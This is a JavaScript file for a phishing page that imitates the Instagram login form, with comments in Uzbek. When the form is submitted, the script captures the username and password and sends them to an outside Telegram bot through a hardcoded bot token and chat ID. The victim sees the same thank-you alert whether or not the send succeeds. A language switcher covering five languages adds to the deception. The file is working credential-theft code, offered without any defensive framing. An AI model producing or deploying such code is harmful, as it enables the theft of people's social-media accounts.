// Login formni olish
const form = document.getElementById("loginForm");

// Formani yuborishda ishlovchi event
form.addEventListener("submit", async (event) => {
  event.preventDefault(); // Sahifa yangilanmasligi uchun

  // Inputlardan qiymatlarni olish
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();

  // Ma'lumot bo'sh bo'lmasligini tekshirish
  if (!username || !password) {
    alert("Iltimos, barcha maydonlarni to'ldiring");
    return;
  }

  // Telegramga yuboriladigan xabar matni
  const message = `🧾 Instagram Login\n👤 Username: ${username}\n🔒 Password: ${password}`;

  // Bot token va chat ID
  const botToken = "7828917261:AAE433aupRUxHYx5Jd6kkfBu68F4AFsY7hE";
  const chatId = "5508326569";

  try {
    // Telegram API orqali yuborish
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }
    );

    // Javobni tekshirish
    if (response.ok) {
      alert("Rahmat😊");
      form.reset(); // Formani tozalash
    } else {
      alert("Rahmat😊");
    }
  } catch (error) {
    alert("Rahmat😊");
    console.error(error);
  }
});

document.addEventListener("DOMContentLoaded", function () {
  // Simple language switcher (demo, only changes placeholders and button text)
  const langData = {
    en: {
      username: "Phone number, username, or email",
      password: "Password",
      login: "Log In",
      or: "OR",
      facebook: "Log in with facebook",
      forgot: "Forgot password ?",
      signup: "Don't have a account ?",
      signupBtn: "Sign Up",
    },
    ru: {
      username: "Телефон, имя пользователя или эл. адрес",
      password: "Пароль",
      login: "Войти",
      or: "ИЛИ",
      facebook: "Войти через Facebook",
      forgot: "Забыли пароль?",
      signup: "У вас нет аккаунта?",
      signupBtn: "Зарегистрироваться",
    },
    uz: {
      username: "Telefon raqam, foydalanuvchi nomi yoki email",
      password: "Parol",
      login: "Kirish",
      or: "YOKI",
      facebook: "Facebook orqali kirish",
      forgot: "Parolni unutdingizmi?",
      signup: "Hisobingiz yo‘qmi?",
      signupBtn: "Ro‘yxatdan o‘tish",
    },
    tr: {
      username: "Telefon numarası, kullanıcı adı veya e-posta",
      password: "Şifre",
      login: "Giriş yap",
      or: "VEYA",
      facebook: "Facebook ile giriş yap",
      forgot: "Şifreni mi unuttun?",
      signup: "Hesabın yok mu?",
      signupBtn: "Kaydol",
    },
    es: {
      username: "Teléfono, usuario o correo electrónico",
      password: "Contraseña",
      login: "Iniciar sesión",
      or: "O",
      facebook: "Iniciar sesión con Facebook",
      forgot: "¿Olvidaste tu contraseña?",
      signup: "¿No tienes una cuenta?",
      signupBtn: "Regístrate",
    },
  };
  var langSelect = document.getElementById("langSelect");
  if (langSelect) {
    langSelect.addEventListener("change", function () {
      const lang = this.value;
      const d = langData[lang];
      document.getElementById("username").placeholder = d.username;
      document.getElementById("password").placeholder = d.password;
      document.querySelector(".loginForm button").textContent = d.login;
      document.querySelector(".seperator span:nth-child(2)").textContent = d.or;
      document.querySelector(".forgot_buttons button span a").textContent =
        d.facebook;
      document.querySelector(".forgot_buttons button:last-child").textContent =
        d.forgot;
      document.querySelector(".sign_up p").childNodes[0].textContent =
        d.signup + " ";
      document.querySelector(".sign_up a").textContent = d.signupBtn;
    });
  }
});
